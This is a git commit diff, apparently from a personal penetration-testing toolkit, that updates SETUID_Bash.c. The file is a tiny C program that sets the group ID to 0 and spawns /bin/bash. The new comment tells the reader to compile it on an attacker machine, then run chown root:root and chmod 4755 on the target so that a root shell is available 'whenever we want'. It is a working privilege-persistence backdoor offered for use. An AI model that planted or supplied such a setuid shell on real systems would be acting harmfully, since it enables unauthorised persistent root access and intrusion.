438d64b8517972e85e887f2493ae68fc5911621e
root <root@localhost.localdomain>
2019-09-27 04:47:36 -0400

    modified:   ../Commands/kali_update 	modified:   SETUID_Bash.c 	modified:   ../Tools/AutoRecon

--- Shells/SETUID_Bash.c
+++ Shells/SETUID_Bash.c
@@ -4,5 +4,12 @@ int main (void)
 	setgid(0);
 	system("/bin/bash");
 }
-/*gcc SETUID_Bash.c -o SETUID_Bash
-chmod +x SETUID_Bash*/
+/*
+On attacker machine before transfer:
+	gcc SETUID_Bash.c -o SETUID_Bash
+	chmod +x SETUID_Bash
+Commands to be injected on target machine to execute this program as elevated privleges whenever we want.
+	Chown root:root [compiled program path]
+		- Or whatever UID:GID we elevate to.
+	Chmod 4755 [compiled program path]
+*/
